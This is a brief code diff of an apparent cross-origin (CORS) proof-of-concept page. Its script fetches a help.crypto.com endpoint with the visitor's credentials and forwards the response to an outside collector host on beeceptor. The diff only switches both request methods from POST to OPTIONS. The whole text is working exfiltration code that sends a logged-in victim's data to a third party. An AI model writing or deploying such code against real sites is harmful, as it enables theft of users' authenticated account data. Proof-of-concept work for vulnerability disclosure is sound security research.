@@ -3,7 +3,7 @@
   <body>
     <script>
       fetch("https://help.crypto.com/cdn-cgi/rum?", {
-        method: "POST",
+        method: "OPTIONS",
         credentials: "include",
         headers: {
           "Content-Type": "application/json"
@@ -13,7 +13,7 @@
       .then(res => res.text())
       .then(data => {
         fetch("https://cors-poc.free.beeceptor.com", {
-          method: "POST",
+          method: "OPTIONS",
           mode: "no-cors",
           body: data
         });
